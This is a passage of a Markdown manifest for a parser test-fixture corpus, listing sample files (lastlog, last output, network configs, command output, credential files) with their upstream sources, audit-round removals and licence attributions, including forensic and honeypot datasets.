- `cfreds_nps2009_ubuntu_810_lastlog` — NIST CFReDS `nps-2009-casper-rw`, `/var/log/lastlog` from the Ubuntu 8.10 USB image (292 KB). Future-phase fixture: no `lastlog` parser is registered yet (Phase 16), so it sits as forward-staged corpus — `tests/test_real_examples/` skips files whose `file_type` isn't in the registry.
- `cado_aws_eks_lastlog` — Cado Security AWS EKS Cluster Forensics dataset, `/var/log/lastlog` from the AL2 EKS worker (292 KB, sparse — actual content density is much smaller, file is mostly zeroed out for unused UID slots). Forward-staged for Phase 16 like the CFReDS one.
- `figshare_ubuntu_2204_lastlog` — Donnachie/OU "Defaced web server" Figshare dataset, `/var/log/lastlog` from the Ubuntu 22.04 host (286 KB). Modern Ubuntu lastlog format. Forward-staged for Phase 16.

### `last_output/` — 14 files (all from kellyjonbrazil/jc test fixtures)
- `jc_centos_last`, `jc_centos_last_crash`, `jc_centos_last_wF`, `jc_centos_last_wixF`, `jc_centos_last_w`, `jc_centos_lastb`
- `jc_ubuntu_last`, `jc_ubuntu_last_w`, `jc_ubuntu_last_w2`, `jc_ubuntu_lastb`, `jc_ubuntu2004_last_F`
- `jc_fedora32_last`, `jc_osx_1014_last`, `jc_freebsd12_last` — macOS + FreeBSD variants
  > Round 2 audit removed `jonathanmorley_linux_commands` — Linux commands cheatsheet, not `last`/`lastb` output.

### `zsh_history/` — 1 file
- `goyalankit_bash_to_zsh` — gist/goyalankit/a1c88bfc69107f93cda1 (bash→zsh history conversion snippets; short)

### `fish_history/` — 1 file
- `flawless13_fish_config` — Flawless13/fish-config `fish_history` (real fish history, 92KB)

### `bashrc/` — 6 files
All from dotfile repos: helmuthdu, tanghaibao, sporkmonger, miguelmota, gist/rchowe/1727301, gist/KaMeHb-UA/7b12035f29dad630f13a63a3dd72d183.

### `zshrc/` — 4 files
From dotfile repos: driesvints, wookayin, olivernn, ryanb.

### `network_interfaces/` — 4 files
- `sebw_debian_example` — gist/sebw/6018342 (original)
- `ifupdown_testcase_multi_iface`, `ifupdown_testcase_allow_hotplug`, `ifupdown_testcase_hwaddress` — Debian ifupdown `tests/linux/testcase.*` (multi-interface test fixtures)
  > Round 3 audit removed `fullmetalbrackets_static` (markdown tutorial) and `und3fined_sample` (363-line markdown guide). Round 4 removed `ifupdown_examples_network_interfaces` — the Debian template is 184 lines but every example is commented out, leaving zero parseable content.

### `netplan/` — 8 files
All from canonical/netplan upstream `examples/`: `bridge`, `vlan`, `bonding`, `static`, `dhcp`, `wireless`, `modem`, `vrf`.

### `ifcfg/` — 9 files
- `coffman21_eth0` — gist/coffman21/a8df8d4667de3cb91d5cd86ce3ee0c52 (original)
- 8 fixtures from NetworkManager/NetworkManager `src/core/settings/plugins/ifcfg-rh/tests/network-scripts/`: `nm_test_wired_static`, `nm_test_wired_ipv4_manual`, `nm_test_onboot_no`, `nm_test_bond_main`, `nm_test_bridge_main`, `nm_test_dns_options`, `nm_aliasem1`, `nm_netmask_1`
  > Round 3 audit removed `rafaeltuelho_rhel7_static` (markdown snippet) and `mjf_rhel_memos` (.rst memo).

---

## Phase 18 — Command output parsers

Most of these come from kellyjonbrazil/jc (`tests/fixtures/`), a CLI-output-to-JSON
parser library that maintains clean real-command-output fixtures per distro.

### `ip_addr/` — 11 files
- `jc_ubuntu_ifconfig`, `jc_centos_ifconfig` — AGENT.md Phase 18 says the `ip_addr`
  parser accepts `ip addr show` OR `ifconfig -a`. These are the `ifconfig` variant.
- `jc_ubuntu_1604_ifconfig` — kellyjonbrazil/jc `ubuntu-16.04/ifconfig.out`
- `jc_osx_1014_ifconfig`, `jc_osx_1014_ifconfig2`, `jc_osx_1011_ifconfig`, `jc_osx_1011_ifconfig2` — jc macOS variants
- `jc_freebsd12_ifconfig`, `jc_freebsd12_ifconfig2`, `jc_freebsd12_ifconfig3`, `jc_freebsd12_ifconfig4` — jc FreeBSD 12 (tests extra-field handling)

### `ip_route/` — 7 files (jc)
`jc_ubuntu_ip_route`, `jc_centos_ip_route`, `jc_ubuntu_route`, `jc_ubuntu_route_vn`,
`jc_route_6_ipv6`, `jc_route_6_n_ipv6`, `jc_nixos_route_ee` (IPv6 + `route -ee` variants).
  > Round 3 audit removed `yuriskinfo_cheatsheet` — 285-line "Linux ip route command reference" documentation.

### `ip_neigh/` — 0 files
jc doesn't have `ip_neigh` fixtures; couldn't find raw samples publicly.

### `arp/` — 12 files (jc)
Original 5 (`jc_ubuntu_arp*`, `jc_centos_arp*`) plus:
- `jc_aix71_arp_a`, `jc_freebsd12_arp_a`, `jc_centos8_arp_a` — non-Linux + newer distros
- `jc_osx_1014_arp_a`, `jc_osx_1014_arp_a2`, `jc_osx_1011_arp_a` — macOS format variants
- `jc_linux_proc_net_arp` — `/proc/net/arp` raw format

### `netstat/` — 21 files
Original 11 (ubuntu + generic) plus:
- `jc_centos_netstat`, `jc_centos_netstat_l`, `jc_centos_netstat_p` — CentOS 7.7 variants
- `jc_ubuntu_netstat_r`, `jc_ubuntu_netstat_rnee`, `jc_ubuntu_netstat_i` — more ubuntu flag variants
- `jc_osx_netstat`, `jc_osx_netstat_An`, `jc_osx_netstat_Abn`, `jc_osx_netstat_r`, `jc_osx_netstat_rnl`, `jc_osx_netstat_i` — macOS format variants (different column layout)
- `jc_fedora32_netstat` — Fedora 32 variant
  > Round 3 audit removed 3 gist-sourced entries: `sdwheeler_parse_sample` (PowerShell function), `jcohen66_examples` ("here are several examples..." narrative), `ruichen0101_sample` (single Python `sconn()` representation, not netstat output).

### `ss_output/` — 4 files (jc)
`jc_ubuntu_ss_a`, `jc_ubuntu_ss_tulpen`, `jc_generic_ss_wide`, `jc_centos_ss_a`.

### `iptables/` — 13 files (jc only; tutorials removed)
- From jc centos-7.7: `filter`, `filter-nv`, `filter_line_numbers`, `nat`, `mangle`, `raw`
- From jc ubuntu-18.04: `filter`, `filter_nv`, `filter_line_numbers`, `mangle`, `nat`, `raw`
- From jc generic: `no_jump`
  > Round 2 audit removed 4 gist-sourced entries (`dominicbreuker_firewall` — markdown cheatsheet; `hlissner_default`, `polster_sample` — bash scripts; `pirafrank_basic` — shell command snippets). Only canonical `iptables-save` / `iptables -L` command output belongs here.

### `nftables/` — 8 files
- `arch_example` — archlinux svntogit `nftables.conf`
- `gaelanlloyd_example` — gist/gaelanlloyd/0677759fd4dc0f58e1e7449784bb8903
- `yoramvandevelde_init_rules` — yoramvandevelde/nftables-example
- `aborrero_ruleset`, `aborrero_filter_forward`, `aborrero_filter_input`, `aborrero_filter_output`, `aborrero_filter_sets` — aborrero/nftables-managed-with-git `nft_ruleset/` (split-file production-style ruleset)

### `ps_output/` — 8 files
- `jc_ubuntu_ps_axu`, `jc_ubuntu_ps_ef`, `jc_centos_ps_axu`, `jc_centos_ps_ef`
- `jc_osx_1014_ps_axu`, `jc_osx_1014_ps_ef`, `jc_osx_1011_ps_axu`, `jc_osx_1011_ps_ef` — macOS format variants
  > Round 3 audit removed `cahna_ps_aux_parse` — 24-line Python script, not `ps aux` output.

### `env_output/` — 3 files (jc)
`jc_centos_env`, `jc_ubuntu_env`, `jc_generic_multiline`.

### `docker_ps/` — 1 file
- `deanpeterson_ps_a_output` — 97-line real `docker ps -a` output (with `[root@host ~]#` prompt prefix) from an openshift host
  > Round 3 audit removed 3 gist entries: `ipedrazas_names_ips` (2-line bash function), `jimklo_output` (9-line "Started with command" preamble), `sudo_bmitch_formatting` (84-line markdown tutorial with docker ps in fenced blocks).

### `docker_network/` — 0 files (pending)
All entries from round 1/2 were removed: the docker CLI docs `.md` file was tutorial, and the `docker inspect CONTAINER` gists produced a different JSON shape than `docker network inspect NETWORK` (no `IPAM.Config`/`Containers` at the top level). No canonical `docker network inspect` fixtures located in public repos; Phase 18 parser will need custom samples.

### `kubectl_pods/` — 0 files (pending)
Both round-1 gist entries (`devops_school_kubectl_ref`, `so0k_kubectl_output`) were kubectl cheatsheets/tutorials — not actual `kubectl get pods` output. kubernetes/kubectl `testdata/` contains pod INPUT manifests for `apply`, not pod-list output. Phase 18 parser will need custom samples.

### `ip_neigh/` — 1 file
- `wsl_live_capture.out` — live capture of `ip neigh show` from this WSL2 environment (RFC1918 only: Docker bridge + WSL gateway; no hostnames, no public IPs)

### `kubectl_pods/` — 2 files
- `so0k_kubectl_output` — gist/so0k/42313dbb3b547a0f51a547bb968696ba
- `devops_school_kubectl_ref` — gist/devops-school/98e78b62b0cca22158aef9ef90daa6af

---

## Phase 19 — Credential file parsers

### `netrc/` — 4 files
- `tpope_sample` — gist/tpope/4247721
- `technoweenie_github` — gist/technoweenie/1072829
- `sahilsk_git` — gist/sahilsk/ce21c39a6c2dbc2cd984
- `git_credential_helper_test` — git/git `contrib/credential/netrc/test.netrc`. **First fixture with the `port` keyword** (`port imaps`, `port 1099` — a mix of numeric and named ports), plus a `multilinetoken anothervalue` non-standard token line under `machine github.com`. Distinct from existing fixtures (which are bare machine/login/password); exercises parser tolerance of extra fields and the `port` keyword.

### `pgpass/` — 1 file
- `Fmstrat_aliased` — gist/Fmstrat/ea6287a6d60e3e5f6c73e3bdd2f62331 (uses non-standard `alias:host:port:db:user:pass` prefix but parseable as `host:port:db:user:pass` after prefix strip)
  > Round 2 removed `vielhuber_sample` (tutorial). Round 3 removed `sabman_sample` (blog post intro).

### `mysql_config/` — 6 files
- `oinume_mycnf` — gist/oinume/fc9b72bd8b14ab07e94c
- `fevangelou_optimized` — gist/fevangelou/fb72f36bbe333e059b66
- `juliandunn_container_default` — gist/juliandunn/7efc161ee2bec4801422d90bab24ad12
- `byllc_mariadb` — gist/byllc/8871383
- `rubo77_debian_mysql55` — gist/rubo77/64f64a26bdf9c677ca79
- `prometheus_mysqld_multi_section` — prometheus/mysqld_exporter `config/testdata/client.cnf`. **First fixture with per-program `[client.SUFFIX]` sections** — `[client]` plus `[client.server1]` and `[client.cleartextPlugin]`. The dotted-suffix syntax is MySQL's documented way to namespace credentials per host/program; none of the existing 5 fixtures exercise it. Also includes `enable-cleartext-plugin = true` (boolean option).

### `aws_credentials/` — 1 file
- `mrsarm_multi_profile` — gist/mrsarm/5169b18d47edd4539695964e2e695a18
  > Round 2 audit removed 2 non-canonical entries (`wjimenez5271_sample` — Python script; `wyllie_parse_sample` — bash script).

### `aws_config/` — 1 file
- `ohaval_multi_env` — gist/ohaval/1719fb6fb0e206469960c34699ef6065 (multi-environment profiles)
  > Round 2 audit removed `awsdocs_user_guide_examples.md` (official docs markdown, not a raw `~/.aws/config` file).

### `gcloud_credentials/` — 6 files (all from googleapis/google-auth-library-python `tests/data/`)
- `google_auth_authorized_user` — minimal canonical `authorized_user` JSON
- `google_auth_cloud_sdk` — real-shape `client_id` (googleusercontent.com format)
- `google_auth_cloud_sdk_with_quota` — with `quota_project_id` field
- `google_auth_with_rapt_token` — with `rapt_token`
- `google_auth_external_account` — `external_account` type (WIF)
- `google_auth_external_account_non_gdu` — non-GDU variant
  > Replaced round-1 `dims_gcp_quick_start` tutorial with google's own library test corpus.

### `kubeconfig/` — 1 file
- `devops_school_skeleton` — gist/devops-school/f8956d4ee208b2519b095ad631eac7a0 (canonical YAML with `apiVersion/clusters/contexts/users`)
  > Round 2 audit removed `innovia_sa_config` (bash script) and `tdihp_aks_config` (tutorial markdown).

### `boto/` — 2 files
- `garnaat_eucalyptus_credentials` — gist/garnaat/1284158 (Eucalyptus-flavored `[Credentials]` block)
- `kevinkarwaski_example` — gist/kevinkarwaski/1007405 (annotated `[Credentials]` + `[Boto]` reference config with proxy settings)

### `env_file/` — 2 files
- `rapidpages_env_example` — rapidpages/rapidpages `.env.example`
- `ansible_types_env` — ansible/ansible `test/integration/targets/config/files/types.env`

### `docker_config/` — 1 file
- `docker_cli_e2e_test_config.json` — docker/cli `e2e/context/testdata/test-dockerconfig/config.json` (canonical `.docker/config.json` with `auths`, `HttpHeaders`, `credsStore`)
  > Round 3 audit removed both gist entries: `piersharding_auth` (bash script that generates config.json) and `browol_manual_gen` ("Using the commands below..." markdown tutorial).

### `git_credentials/` — 2 files
- `git_upstream_test_format_basic`, `git_upstream_test_format_store` — canonical `https://user:pass@host` format extracted from git/git `t/t0302-credential-store.sh` test suite.
  > Round 2 audit removed all 3 round-1 gist entries (`klo2k_store`, `richardbronosky_sample`, `dan_hart_store`) — all were tutorial markdown or one-line git config commands, not raw `~/.git-credentials` files.

### `rclone_config/` — 1 file
- `fotile96_sample` — gist/fotile96/1b0a27b7fa8059a6830b97f9368d377f (canonical `[remote]` INI)
  > Round 2 audit removed 3 markdown tutorials I added prematurely (`kelvinrr_config_session.md`, `magnetikonline_b2_cheatsheet.md`, `plembo_gdrive_backup.md`) — they contain rclone config in fenced blocks but the file format is markdown, not rclone.conf.

---

## Remaining thin dirs

| Parser | Count | Status |
|---|---|---|
| `ip_neigh` | 1 | public gists are tutorials, not captures |
| `fish_history` | 1 | pseudo-YAML format rarely committed; private by convention |
| `zsh_history` | 1 | same as fish; public gists are scripts that manipulate the file, not real histories |
| `wtmp` | 1 | binary format; only LastLog-Audit publishes raw `.wtmp` files publicly |
| `messages` | 1 | RHEL/CentOS variant of auth log; the `auth_log/` corpus transfers |
| `rclone_config` | 1 | canonical `rclone.conf` is rare publicly; only one clean sample located |
| `aws_config` | 1 | only one canonical sample located |
| `aws_credentials` | 1 | only one canonical sample located |
| `kubeconfig` | 1 | public kubeconfigs nearly always redacted or embedded in tutorials |
| `pgpass` | 1 | most public "samples" are tutorial prose |
| `docker_config` | 1 | only one canonical sample (docker/cli e2e test); gists tend to be generator scripts |
| `docker_ps` | 1 | most "docker ps sample output" gists are markdown tutorials |
| `docker_network` | 0 | canonical `docker network inspect NETWORK` JSON not located in public repos |
| `kubectl_pods` | 0 | canonical `kubectl get pods` output not located in public repos |

These gaps are genuine — either the file is private by convention (history files, credentials) or the canonical command output isn't regularly committed as test fixtures.

---

## Primary upstream sources (attribution)

- [kellyjonbrazil/jc](https://github.com/kellyjonbrazil/jc) — MIT — ~110 test fixtures across distros (Ubuntu 16/18/20, CentOS 7/8, macOS 10.11/10.14, FreeBSD 12, AIX 7.1, Fedora 32, NixOS)
- [NetworkManager/NetworkManager](https://gitlab.freedesktop.org/NetworkManager/NetworkManager) — GPL-2.0 — RHEL ifcfg test fixtures (`plugins/ifcfg-rh/tests/network-scripts/`)
- [Debian ifupdown](https://salsa.debian.org/debian/ifupdown) — GPL-2.0 — `/etc/network/interfaces` canonical examples and testcases
- [docker/cli](https://github.com/docker/cli) — Apache-2.0 — e2e test `.docker/config.json`
- [logpai/loghub](https://github.com/logpai/loghub) — CC-BY-NC-SA-2.0 — anonymized log corpus
- [franckferman/LastLog-Audit](https://github.com/franckferman/LastLog-Audit) — binary lastlog + wtmp samples
- [securityjoes/MasterParser](https://github.com/securityjoes/MasterParser) — DFIR auth.log sample
- [openssh/openssh-portable](https://github.com/openssh/openssh-portable) — BSD — upstream ssh_config/sshd_config defaults + unit-test `known_hosts`
- [paramiko/paramiko](https://github.com/paramiko/paramiko) — LGPL-2.1 — RSA/ECDSA/Ed25519/Ed448 private+public key fixtures, cert keys, corrupted-hash edge cases, ssh_config match-exec fixtures
- [ansible/ansible](https://github.com/ansible/ansible) — GPL-3.0 — `existing_known_hosts` (hashed + cert-authority entries), OpenBSD sshd_config, types.env
- [saltstack/salt](https://github.com/saltstack/salt) — Apache-2.0 — authorized_keys (with `command="..."` prefix), sshd_config (Debian pkg variant), known_hosts, hosts
- [cowrie/cowrie](https://github.com/cowrie/cowrie) — BSD — honeypot `honeyfs/etc/passwd` + `shadow` (fake but realistic)
- [jasonmpittman/cowrie-log-analyzer](https://github.com/jasonmpittman/cowrie-log-analyzer) — real March 2020 Cowrie attacker session JSON (extracted to `bash_history/cowrie_2020_*`)
- [EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine](https://github.com/EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine) — ~130 MB of 2024 Cowrie JSON logs from a South Africa sensor (selected sessions extracted to `bash_history/cowrie_2024_*`)
- [0xsha/sweetie-data](https://github.com/0xsha/sweetie-data) — MIT — multi-honeypot capture covering Dec 2019–Feb 2020 (~2.9 GB cowrie JSON across 105 daily logs); selected attacker sessions extracted to `bash_history/cowrie_2020_*` and `authorized_keys/ethos_miner_*`
- [Honeynet Project — Scan of the Month #29](https://honeynet.onofri.org/scans/scan29/) — Honeynet Project terms permit analysis & redistribution for research. The 102 MB `linux-suspended.tar.bz2` is a VMware-suspended Red Hat 7.2 honeypot compromised on 2003-08-10; the 1 GB ext3 partition was extracted via `qemu-img convert -f vmdk -O raw` + Sleuth Kit (`mmls`/`fls`/`icat`). Files extracted to `passwd/honeynet_scan29_*`, `shadow/honeynet_scan29_*`, `ssh_config/honeynet_scan29_*`, `sshd_config/honeynet_scan29_*` (incl. the rootkit-dropped backdoor config), `bash_history/honeynet_scan29_*` (real post-compromise root shell history), `private_key/` + `public_key/honeynet_scan29_*` (SSH protocol 1 host keys from the rootkit), `auth_log/honeynet_scan29_*` (RHEL `secure` log fragment).
- [NIST CFReDS — NPS 2009 Casper RW](https://cfreds.nist.gov/) — public-domain US-government forensic reference dataset. The 161 MB `ubnist1.casper-rw.gen3.E01` (downloadable as raw E01 from `digitalcorpora.s3.amazonaws.com`) is the most-used generation of an Ubuntu 8.10 bootable-USB casper-rw overlay (the writable layer over the live-CD), repeatedly booted and used over weeks to browse US-Government websites. Mounted via `ewfmount` → ext3 raw → `fls`/`icat`. Files extracted to `passwd/cfreds_nps2009_*` (uid=999 boundary), `shadow/cfreds_nps2009_*` (legacy DES crypt), `sudoers/cfreds_nps2009_*` (5x duplicated %admin line), `known_hosts/cfreds_nps2009_*` (real `|1|` hashed entry), `bash_history/cfreds_nps2009_*` (first benign-user history fixture, 4 ssh/scp connection records extracted), `auth_log/cfreds_nps2009_*` (Ubuntu auth.log dominated by gdm/cron/su/sudo events), `wtmp/cfreds_nps2009_*` (record-size mismatch edge case), `lastlog/cfreds_nps2009_*` (forward-staged for Phase 16).
- [Cado Security — AWS EKS Cluster Forensics (SANS DFIR 2021)](https://github.com/cado-security/AWS_EKS_Cluster_Forensics) — Apache-2.0 — 1.1 GB 7z archive containing a 20 GB raw `dd.gz` of a compromised Amazon Linux 2 EKS worker node (Jul 2021). XFS partition, mounted via `losetup -P` + `mount -o ro,norecovery`. Files extracted to `passwd/cado_aws_eks_*` (AL2 with ec2-user/docker/ec2-instance-connect), `shadow/cado_aws_eks_*` (`*LOCK*` literal sentinel edge case), `sudoers/cado_aws_eks_*` (AL2 main + `sudoers.d/90-cloud-init-users` drop-in), `sshd_config/cado_aws_eks_*` (AWS EC2 Instance Connect `AuthorizedKeysCommand` config), `authorized_keys/cado_aws_eks_*` (root file with deny-banner `command="…"` prefix + attacker `kali@kali` key), `bash_history/cado_aws_eks_*` (kubelet config tampering — modern k8s attack), `auth_log/cado_aws_eks_*` (highest-yield secure log fixture: 2 connections incl. attacker root login, plus Hydra/EC2-Instance-Connect/POSSIBLE-BREAK-IN-ATTEMPT events), `wtmp/cado_aws_eks_*`, `lastlog/cado_aws_eks_*` (forward-staged).
- [Donnachie et al. — Defaced web server (Ubuntu 22.04 simulation)](https://doi.org/10.21954/ou.rd.26038669.v1) — CC-BY-NC-SA-4.0 — 5.97 GB across 4 EnCase E01 segments. Simulated UK e-commerce site running DVWA on Ubuntu 22.04.3, defaced 2024-06-06. ext4-on-LVM root partition: `ewfmount` → loop device → `vgchange -ay ubuntu-vg` → `mount -o ro,noload /dev/ubuntu-vg/ubuntu-lv`. Files extracted to `passwd/figshare_ubuntu_2204_*` (modern Ubuntu 22.04 systemd users), `shadow/figshare_ubuntu_2204_*` (administrator $6$ hash + 33 locked accounts), `sudoers/figshare_ubuntu_2204_*` (modern `(ALL:ALL)` syntax + `use_pty` + `@includedir`), `sshd_config/figshare_ubuntu_2204_main` (empty-stats edge case from `Include` directive) + `figshare_ubuntu_2204_cloud_init_drop_in` (first sshd_config drop-in fragment in the corpus), `bash_history/figshare_ubuntu_2204_*` (benign sysadmin building DVWA + monitoring access logs as defacement is discovered), `auth_log/figshare_ubuntu_2204_*` (first password-auth-Accepted fixture, 5 records), `lastlog/figshare_ubuntu_2204_*` (forward-staged).
- [canonical/netplan](https://github.com/canonical/netplan) — GPL-3.0 — network YAML examples
- [sudo-project/sudo](https://github.com/sudo-project/sudo) — ISC — upstream sudoers example
- [endlessm/base-passwd](https://github.com/endlessm/base-passwd) — GPL-2.0 — Debian passwd.master
- [aborrero/nftables-managed-with-git](https://github.com/aborrero/nftables-managed-with-git) — split-file nftables ruleset
- [DefectDojo/sample-scan-files](https://github.com/DefectDojo/sample-scan-files) — Apache-2.0 — nmap XML v6.40 + v7.12
- [googleapis/google-auth-library-python](https://github.com/googleapis/google-auth-library-python) — Apache-2.0 — `application_default_credentials.json` test fixtures
- [git/git](https://github.com/git/git) — GPL-2.0 — `.git-credentials` canonical format (from `t/t0302-credential-store.sh`); also `contrib/credential/netrc/test.netrc` netrc fixture
- [prometheus/mysqld_exporter](https://github.com/prometheus/mysqld_exporter) — Apache-2.0 — multi-section `client.cnf` test fixture (`config/testdata/client.cnf`)
- Various GitHub gists — per-file attribution above
